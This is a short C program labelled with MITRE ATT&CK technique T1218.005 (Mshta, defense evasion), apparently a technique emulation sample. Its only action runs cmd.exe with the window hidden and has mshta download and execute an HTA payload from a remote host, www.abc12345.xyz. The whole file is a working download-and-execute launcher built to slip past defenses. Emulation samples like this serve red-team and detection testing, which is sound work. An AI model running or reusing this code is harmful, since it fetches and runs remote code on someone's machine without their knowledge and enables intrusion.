// Link      = https://attack.mitre.org/techniques/T1218/005/
// Technique = System Binary Proxy Execution: Mshta
// ID        = T1218.005
// Tactics   = Defense Evasion

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "mshta http://www.abc12345.xyz/payload.hta",
        NULL,
        SW_HIDE
    );

    return 0;
}

